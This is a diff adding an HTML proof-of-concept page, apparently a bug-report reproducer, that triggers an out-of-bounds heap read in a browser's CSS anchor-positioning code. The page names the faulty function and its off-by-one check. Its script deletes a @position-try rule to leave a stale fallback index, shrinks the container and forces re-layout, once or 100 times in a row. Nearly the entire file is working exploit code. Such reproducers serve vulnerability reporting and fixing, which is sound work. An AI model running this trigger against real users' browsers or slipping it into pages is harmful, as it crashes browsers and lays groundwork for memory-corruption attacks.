@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>CSS Anchor Positioning OOB — PoC</title>
+<style>
+  body { font-family: monospace; padding: 1rem; background: #111; color: #ccc; }
+  h2 { color: #e88; margin-bottom: 0.4rem; }
+  .info { font-size: 0.85rem; color: #888; margin-bottom: 1rem; }
+  button { background: #c33; color: #fff; border: none; padding: 0.5rem 1.2rem; cursor: pointer; font-size: 1rem; border-radius: 3px; margin-right: 0.5rem; }
+  #log { background: #1a1a1a; border: 1px solid #333; padding: 0.8rem; min-height: 80px; white-space: pre; font-size: 0.82rem; margin-top: 1rem; color: #8f8; }
+  .scene { margin-top: 1.2rem; display: flex; gap: 1rem; align-items: flex-start; flex-wrap: wrap; }
+  .scene-label { font-size: 0.75rem; color: #666; margin-bottom: 0.3rem; }
+
+  /* ---- Tiny containing block so --left and --above overflow ---- */
+  #container {
+    position: relative;
+    width: 60px;
+    height: 60px;
+    overflow: hidden;
+    border: 1px solid #555;
+    background: #222;
+  }
+  #anchor {
+    anchor-name: --anch;
+    position: absolute;
+    top: 10px; left: 10px;
+    width: 10px; height: 10px;
+    background: #e44;
+  }
+
+  /* Fallback 0 — overflows left edge of container */
+  @position-try --left  { left: anchor(left); transform: translateX(-100%); }
+  /* Fallback 1 — overflows top edge of container */
+  @position-try --above { top: anchor(top);   transform: translateY(-100%); }
+  /* Fallback 2 — fits (anchor near left edge, right of anchor is inside) */
+  @position-try --right { left: anchor(right); }
+
+  #target {
+    position: absolute;
+    position-anchor: --anch;
+    /* 3 fallbacks: stale index 2 after first layout succeeds on --right */
+    position-try-fallbacks: --left, --above, --right;
+    width: 20px; height: 20px;
+    background: #44e;
+  }
+</style>
+</head>
+<body>
+<h2>CSS Anchor Positioning OOB — Stale Fallback Index</h2>
+<div class="info">
+  Bug: out_of_flow_layout_part.cc — MoveToLastSuccessfulOrStyleWithoutFallbacks()
+  reads stale index without HasStaleFallbackData() check; CHECK_LE off-by-one
+  allows index == size → one-past-end read of HeapVector&lt;PositionTryFallback&gt;.
+  Chrome 125+ required.
+</div>
+
+<button id="btn-single">Trigger once</button>
+<button id="btn-repeat">Trigger 100×</button>
+
+<div class="scene">
+  <div>
+    <div class="scene-label">Anchor scene (anchor=red, target=blue)</div>
+    <div id="container">
+      <div id="anchor"></div>
+      <div id="target"></div>
+    </div>
+  </div>
+</div>
+<pre id="log">Waiting for initial layout…
+</pre>
+
+<script>
+const log = s => { const el = document.getElementById('log'); el.textContent += s + '\n'; el.scrollTop = el.scrollHeight; };
+
+function runTrigger() {
+  // --- Reset state between repetitions ---
+  // Re-add @position-try --right if it was deleted
+  let hasRight = false;
+  for (const sheet of document.styleSheets) {
+    for (let i = 0; i < sheet.cssRules.length; i++) {
+      const r = sheet.cssRules[i];
+      if (r.name === '--right') { hasRight = true; break; }
+    }
+  }
+  if (!hasRight) {
+    // Inject a fresh stylesheet with --right
+    const st = document.createElement('style');
+    st.textContent = '@position-try --right { left: anchor(right); }';
+    document.head.appendChild(st);
+  }
+  // Restore container size so --right succeeds
+  const ctr = document.getElementById('container');
+  ctr.style.width  = '60px';
+  ctr.style.height = '60px';
+  // Force layout so --right becomes last-successful (index 2)
+  void ctr.offsetTop;
+}
+
+function triggerOOB() {
+  // Step 2: delete @position-try --right → list shrinks to size 2; stale index=2 persists
+  for (const sheet of document.styleSheets) {
+    for (let i = sheet.cssRules.length - 1; i >= 0; i--) {
+      const r = sheet.cssRules[i];
+      if (r.name === '--right') { sheet.deleteRule(i); break; }
+    }
+  }
+  // Step 3: shrink container so --left and --above both overflow → non_overflowing_candidates empty
+  const ctr = document.getElementById('container');
+  ctr.style.width  = '5px';
+  ctr.style.height = '5px';
+  // Step 4: force re-layout — MoveToLastSuccessfulOrStyleWithoutFallbacks fires;
+  // GetLastSuccessfulIndex()=2, GetFallbacks().size()=2, CHECK_LE(2,2) passes → OOB
+  void document.getElementById('target').offsetTop;
+}
+
+let count = 0;
+requestAnimationFrame(() => requestAnimationFrame(() => {
+  log('Initial layout settled — --right (index 2) is last successful.');
+
+  document.getElementById('btn-single').onclick = () => {
+    runTrigger();
+    requestAnimationFrame(() => {
+      triggerOOB();
+      log('[' + (++count) + '] OOB triggered. Release build: silent heap read. ASAN/check build: crash.');
+    });
+  };
+
+  document.getElementById('btn-repeat').onclick = () => {
+    let i = 0;
+    function step() {
+      if (i >= 100) { log('Done — 100 OOB triggers.'); return; }
+      runTrigger();
+      requestAnimationFrame(() => {
+        triggerOOB();
+        log('[' + (++count) + '] OOB triggered (' + (i+1) + '/100)');
+        i++;
+        requestAnimationFrame(step);
+      });
+    }
+    step();
+  };
+}));
+</script>
+</body>
+</html>
